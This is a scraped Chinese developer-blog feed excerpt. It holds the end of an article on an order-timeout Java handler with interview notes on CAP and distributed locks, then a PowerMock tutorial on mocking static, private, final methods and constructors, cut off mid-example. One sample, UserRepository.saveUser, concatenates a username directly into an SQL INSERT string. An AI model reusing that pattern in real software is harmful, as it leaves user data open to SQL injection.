<span class="hljs-variable">@Slf4j</span>
public class OrderCheckHandler implements ACHandler&lt;OrderCheckDTO&gt; {

    <span class="hljs-variable">@Autowired</span>
    private OrderService orderService;

    <span class="hljs-variable">@Autowired</span>
    private ElegentPay elegentPay;

    <span class="hljs-variable">@Override</span>
    public void <span class="hljs-built_in">process</span>(String s, OrderCheckDTO orderCheck) throws Exception {

        <span class="hljs-selector-tag">if</span>(orderCheck == null || Strings.<span class="hljs-built_in">isNullOrEmpty</span>(orderCheck.<span class="hljs-built_in">getOrderNo</span>())) <span class="hljs-selector-tag">return</span>;
        <span class="hljs-comment">//查询订单</span>
        <span class="hljs-selector-tag">OrderEntity</span> <span class="hljs-selector-tag">orderEntity</span> = <span class="hljs-selector-tag">orderService</span><span class="hljs-selector-class">.getByOrderNo</span>(orderCheck.<span class="hljs-built_in">getOrderNo</span>());
        <span class="hljs-selector-tag">if</span>(orderEntity == null) <span class="hljs-selector-tag">return</span>;
        <span class="hljs-selector-tag">if</span>(orderEntity.<span class="hljs-built_in">getStatus</span>().<span class="hljs-built_in">equals</span>(OrderStatus.ORDER_STATUS_CREATE)){  <span class="hljs-comment">//如果是未支付</span>
            <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">"订单无效处理 订单号：{}"</span>,orderCheck.<span class="hljs-built_in">getOrderNo</span>());
            <span class="hljs-selector-tag">orderEntity</span><span class="hljs-selector-class">.setStatus</span>(OrderStatus.ORDER_STATUS_INVALID); <span class="hljs-comment">//无效状态</span>
            <span class="hljs-selector-tag">orderService</span><span class="hljs-selector-class">.updateById</span>(orderEntity);
            <span class="hljs-comment">//关闭支付</span>
            <span class="hljs-selector-tag">elegentPay</span><span class="hljs-selector-class">.closePay</span>( orderEntity.<span class="hljs-built_in">getOrderNo</span>(),orderEntity.<span class="hljs-built_in">getPayType</span>() );
        }
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-42">总结：</h3>
<p>（１）请问你如何理解CAP定理 ？</p>
<p>CAP 定理阐述一个观点： C（一致性）A（可用性）P（分区容错） 不能同时满足。</p>
<p>CP系统： ZK \ consul</p>
<p>AP系统： redis NACOS</p>
<p>（２）什么是BASE理论</p>
<p>基本可用 软状态 最终一致性。</p>
<p>（３）你在项目中是否使用过分布锁？</p>
<p>是，用过。我们使用CONSUL的原因。[分析分布式锁单机版单点故障、红锁性能损失角度逐步分析 ]</p>
<p>（４）你在项目中是否使用过线程池技术？</p>
<p>是，用过。</p>
<p>（５）分布式锁有哪些？</p>
<p>（６）REDISSION分布式锁你是怎么实现的？ 答：常见方法．引出框架和CONSUL分布式锁。</p>
<p>（７）延迟消息你项目中场景是什么？</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用好PowerMock，轻松搞定那些让你头疼的单元测试]]></title>    <link>https://juejin.cn/post/7575102209606221850</link>    <guid>https://juejin.cn/post/7575102209606221850</guid>    <pubDate>2025-11-23T08:26:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102209606221850" data-draft-id="7575119254313844762" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用好PowerMock，轻松搞定那些让你头疼的单元测试"/> <meta itemprop="keywords" content="后端,单元测试"/> <meta itemprop="datePublished" content="2025-11-23T08:26:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java随想录"/> <meta itemprop="url" content="https://juejin.cn/user/2837192913204935"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用好PowerMock，轻松搞定那些让你头疼的单元测试
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2837192913204935/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java随想录
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:26:47.000Z" title="Sun Nov 23 2025 08:26:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文已收录至GitHub，推荐阅读 👉 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FBookSea4j%2FJavaRecord" target="_blank" title="https://github.com/BookSea4j/JavaRecord" ref="nofollow noopener noreferrer">Java随想录</a></p>
<p>微信公众号：Java随想录</p>
<p>结合 <a href="https://juejin.cn/post/7498580969286631434" target="_blank" title="https://juejin.cn/post/7498580969286631434">不用Mockito写单元测试？你可能在浪费一半时间</a> 阅读体验更佳。</p>
<blockquote>
<p>面对无法Mock的静态方法、私有方法和final类，PowerMock为你打开一扇新的大门</p>
</blockquote>
<p>作为一名Java开发者，单元测试是我们保证代码质量的重要环节。但在实际工作中，我们经常会遇到一些难以测试的代码场景：静态工具类、final类、私有方法等。传统的Mockito框架对这些情况束手无策，而PowerMock的出现正好解决了这些痛点。</p>
<h2 data-id="heading-0">PowerMock是什么？为什么需要它？</h2>
<h3 data-id="heading-1">PowerMock的核心定位</h3>
<p>PowerMock是一个强大的Java单元测试框架，它通过扩展现有的Mock框架（如Mockito和EasyMock），提供了更强大的Mock能力。<strong>PowerMock的核心价值在于它能够Mock那些传统Mock工具无法处理的情况</strong>，包括静态方法、final类和方法、私有方法、构造函数等。</p>
<p>与普通Mock框架不同，PowerMock使用自定义的类加载器和字节码操作技术（基于Javassist和ASM库），在运行时修改类的行为，从而实现对这些"难以Mock"的场景的完全控制。</p>
<h3 data-id="heading-2">PowerMock与Mockito的关系和区别</h3>
<p>虽然PowerMock和Mockito都是用于单元测试的Mock框架，但它们在功能和定位上有着明显的区别：</p>
<p><strong>Mockito</strong>是一个轻量级、简单易用的Mock框架，适用于大多数日常测试场景。但它有明显的局限性：无法Mock静态方法、final类、私有方法和构造函数等。</p>
<p><strong>PowerMock</strong>则是对Mockito的增强，填补了Mockito的功能空白。它不是替代Mockito，而是与Mockito协同工作，共同构建完整的单元测试解决方案。</p>
<p>两者核心区别体现在底层实现上：Mockito使用动态代理（CGLIB）技术，而PowerMock通过修改字节码来实现更强大的Mock能力。</p>
<p>正因为这种根本差异，PowerMock可以解决Mockito无法解决的问题。</p>
<h3 data-id="heading-3">PowerMock解决的痛点</h3>
<p>在日常开发中，我们经常会遇到以下测试难题：</p>
<ul>
<li><strong>静态工具类</strong>：如各种Util类中的静态方法。</li>
<li><strong>final类和final方法</strong>：特别是第三方库中的final类。</li>
<li><strong>私有方法</strong>：需要直接测试的私有方法逻辑。</li>
<li><strong>构造函数依赖</strong>：方法内部通过new创建的对象。</li>
<li><strong>静态代码块和系统类</strong>：如System.currentTimeMillis()。</li>
</ul>
<p>这些问题使用传统Mock框架难以解决，而PowerMock为此提供了完整的解决方案</p>
<h2 data-id="heading-4">环境配置与基本用法</h2>
<h3 data-id="heading-5">添加Maven依赖</h3>
<p>要开始使用PowerMock，首先需要在项目中添加相关依赖。由于PowerMock需要与Mockito协同工作，需要同时添加两个依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- PowerMock + Mockito 组合 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.powermock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>powermock-module-junit4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.powermock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>powermock-api-mockito2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>版本兼容性注意</strong>：确保PowerMock与Mockito/JUnit版本匹配，具体兼容性关系可参考官方文档。</p>
<h3 data-id="heading-6">基本配置注解</h3>
<p>使用PowerMock需要在测试类上添加必要的注解：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span> <span class="hljs-comment">// 必须使用PowerMockRunner</span>
<span class="hljs-meta">@PrepareForTest({StaticUtils.class, User.class})</span> <span class="hljs-comment">// 声明需增强的类</span>
<span class="hljs-meta">@PowerMockIgnore("javax.management.*")</span> <span class="hljs-comment">// 解决类加载器冲突</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceTest</span> {
    <span class="hljs-comment">// 测试内容</span>
}
</code></pre>
<ul>
<li><code>@RunWith(PowerMockRunner.class)</code>：告诉JUnit使用PowerMock的测试运行器。</li>
<li><code>@PrepareForTest</code>：指定需要被PowerMock修改的类（包含静态方法、final方法等的类）。</li>
<li><code>@PowerMockIgnore</code>：解决使用PowerMock后可能出现的类加载器冲突问题。</li>
</ul>
<h2 data-id="heading-7">PowerMock核心使用场景详解</h2>
<h3 data-id="heading-8">静态方法Mock</h3>
<p>静态方法是最常见的测试难点之一，让我们看看PowerMock如何解决这个问题。</p>
<p><strong>场景示例</strong>：假设我们有一个静态工具类，用于生成唯一ID：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IdGenerator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateUniqueId</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 实际业务中可能包含复杂的逻辑或外部依赖</span>
        <span class="hljs-keyword">return</span> UUID.randomUUID().toString();
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> IdGenerator.generateUniqueId();
        <span class="hljs-comment">// 创建订单的逻辑</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ORDER_"</span> + orderId;
    }
}
</code></pre>
<p><strong>测试代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest({IdGenerator.class, OrderService.class})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderServiceTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCreateOrderWithStaticMock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 准备静态类的Mock</span>
        PowerMockito.mockStatic(IdGenerator.class);
        
        <span class="hljs-comment">// 2. 预设静态方法行为</span>
        PowerMockito.when(IdGenerator.generateUniqueId()).thenReturn(<span class="hljs-string">"123e4567"</span>);
        
        <span class="hljs-comment">// 3. 创建被测试对象并调用被测方法</span>
        <span class="hljs-type">OrderService</span> <span class="hljs-variable">orderService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderService</span>();
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> orderService.createOrder();
        
        <span class="hljs-comment">// 4. 验证结果</span>
        assertEquals(<span class="hljs-string">"ORDER_123e4567"</span>, result);
        
        <span class="hljs-comment">// 5. 验证静态方法调用（必须调用）</span>
        PowerMockito.verifyStatic(IdGenerator.class);
        IdGenerator.generateUniqueId();
    }
}
</code></pre>
<p><strong>关键点说明</strong>：</p>
<ul>
<li><code>mockStatic()</code>方法用于告诉PowerMock要Mock哪个类的静态方法</li>
<li>静态方法的Stubbing（定义行为）与普通Mockito语法类似</li>
<li><strong>必须调用</strong><code>verifyStatic()</code>来验证静态方法的调用，且需要在验证前调用一次</li>
</ul>
<p><strong>常见坑点</strong>：忘记调用<code>verifyStatic()</code>会导致无法验证静态方法是否被正确调用。</p>
<h3 data-id="heading-9">私有方法Mock</h3>
<p>测试私有方法一直存在争议，但在某些场景下（如复杂算法验证）确实有必要直接测试私有方法。</p>
<p><strong>场景示例</strong>：一个包含复杂校验逻辑的UserService：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validateUser</span><span class="hljs-params">(String username, String password)</span> {
        <span class="hljs-keyword">if</span> (!isValidFormat(username) || !isValidFormat(password)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> internalComplexValidation(username, password);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidFormat</span><span class="hljs-params">(String input)</span> {
        <span class="hljs-comment">// 复杂的格式校验逻辑</span>
        <span class="hljs-keyword">return</span> input != <span class="hljs-literal">null</span> &amp;&amp; input.length() &gt;= <span class="hljs-number">5</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">internalComplexValidation</span><span class="hljs-params">(String username, String password)</span> {
        <span class="hljs-comment">// 非常复杂的内部校验逻辑</span>
        <span class="hljs-comment">// 可能涉及加密、数据库查询等</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 简化示例</span>
    }
}
</code></pre>
<p><strong>测试代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest(UserService.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceTest</span> {

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testPrivateMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. 创建被测类的Spy对象（部分真实调用）</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>();
        <span class="hljs-type">UserService</span> <span class="hljs-variable">spyService</span> <span class="hljs-operator">=</span> PowerMockito.spy(userService);

        <span class="hljs-comment">// 2. Stubbing：预设私有方法行为</span>
        PowerMockito.doReturn(<span class="hljs-literal">true</span>).when(spyService, <span class="hljs-string">"isValidFormat"</span>, Mockito.anyString());

        <span class="hljs-comment">// 3. 调用被测方法</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> spyService.validateUser(<span class="hljs-string">"testuser"</span>, <span class="hljs-string">"testpass"</span>);

        <span class="hljs-comment">// 4. 验证结果</span>
        assertTrue(result);

        <span class="hljs-comment">// 5. 验证私有方法被调用（可选）</span>
        PowerMockito.verifyPrivate(spyService,Mockito.times(<span class="hljs-number">2</span>))
                .invoke(<span class="hljs-string">"isValidFormat"</span>, Mockito.anyString());
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testPrivateMethodWithArguments</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>();
        <span class="hljs-type">UserService</span> <span class="hljs-variable">spyService</span> <span class="hljs-operator">=</span> PowerMockito.spy(userService);

        <span class="hljs-comment">// Mock有参数的私有方法</span>
        PowerMockito.doReturn(<span class="hljs-literal">false</span>)
                .when(spyService, <span class="hljs-string">"internalComplexValidation"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>);

        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> spyService.validateUser(<span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>);

        assertFalse(result);
    }
}
</code></pre>
<p><strong>关键点说明</strong>：</p>
<ul>
<li>使用<code>spy()</code>方法创建对象，这样未被Mock的方法会保持真实行为。</li>
<li>使用<code>doReturn().when()</code>语法来Mock私有方法，需通过方法名字符串指定目标方法。</li>
<li>可以通过<code>verifyPrivate()</code>验证私有方法的调用。</li>
</ul>
<p><strong>最佳实践</strong>：优先通过公共方法测试私有逻辑，仅在复杂算法验证等特殊场景下直接测试私有方法。</p>
<h3 data-id="heading-10">final类与方法Mock</h3>
<p>final类和方法由于其不可继承性，在传统Mock框架中无法被Mock，但PowerMock完美解决了这个问题。</p>
<p><strong>场景示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalUtility</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String <span class="hljs-title function_">finalMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Final implementation"</span>;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String <span class="hljs-title function_">staticFinalMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Static final implementation"</span>;
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">FinalUtility</span> <span class="hljs-variable">utility</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FinalUtility</span>();
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">useFinalClass</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> utility.finalMethod() + <span class="hljs-string">"_processed"</span>;
    }
}
</code></pre>
<p><strong>测试代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest({FinalUtility.class, SomeService.class})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeServiceTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testFinalClassAndMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 创建final类的Mock对象</span>
        <span class="hljs-type">FinalUtility</span> <span class="hljs-variable">mockUtility</span> <span class="hljs-operator">=</span> PowerMockito.mock(FinalUtility.class);
        
        <span class="hljs-comment">// 2. 预设final方法行为</span>
        PowerMockito.when(mockUtility.finalMethod()).thenReturn(<span class="hljs-string">"Mocked final"</span>);
        
        <span class="hljs-comment">// 3. 当创建真实对象时返回Mock对象</span>
        PowerMockito.whenNew(FinalUtility.class).withNoArguments().thenReturn(mockUtility);
        
        <span class="hljs-comment">// 4. 测试</span>
        <span class="hljs-type">SomeService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SomeService</span>();
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> service.useFinalClass();
        
        assertEquals(<span class="hljs-string">"Mocked final_processed"</span>, result);
    }
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStaticFinalMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// Mock静态final方法</span>
        PowerMockito.mockStatic(FinalUtility.class);
        PowerMockito.when(FinalUtility.staticFinalMethod()).thenReturn(<span class="hljs-string">"Mocked static final"</span>);
        
        assertEquals(<span class="hljs-string">"Mocked static final"</span>, FinalUtility.staticFinalMethod());
    }
}
</code></pre>
<p><strong>底层原理</strong>：PowerMock通过修改字节码，去除了final方法的final标识符，从而允许Mock操作。</p>
<h3 data-id="heading-11">构造函数Mock</h3>
<p>当方法内部直接通过new创建对象时，传统Mock难以介入，PowerMock的构造函数Mock功能为此提供了解决方案。</p>
<p><strong>场景示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseConnection</span> {
    <span class="hljs-keyword">private</span> String connectionString;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DatabaseConnection</span><span class="hljs-params">(String connectionString)</span> {
        <span class="hljs-built_in">this</span>.connectionString = connectionString;
        <span class="hljs-comment">// 可能包含复杂的初始化逻辑</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String sql)</span> {
        <span class="hljs-comment">// 执行SQL逻辑</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRepository</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">saveUser</span><span class="hljs-params">(String username)</span> {
        <span class="hljs-comment">// 在方法内部直接创建依赖对象</span>
        <span class="hljs-type">DatabaseConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatabaseConnection</span>(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>);
        <span class="hljs-keyword">return</span> connection.execute(<span class="hljs-string">"INSERT INTO users VALUES ('"</span> + username + <span class="hljs-string">"')"</span>);
    }
}
</code></pre>
<p><strong>测试代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest(UserRepository.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRepositoryTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConstructorMock</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. 创建Mock对象</span>
        <span class="hljs-type">DatabaseConnection</span> <span class="hljs-variable">mockConnection</span> <span class="hljs-operator">=</span> PowerMockito.mock(DatabaseConnection.class);
        
        <span class="hljs-comment">// 2. 预设构造函数行为</span>
        PowerMockito.whenNew(DatabaseConnection.class)
                   .withParameterTypes(String.class)
                   .withArguments(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>)
                   .thenReturn(mockConnection);
        
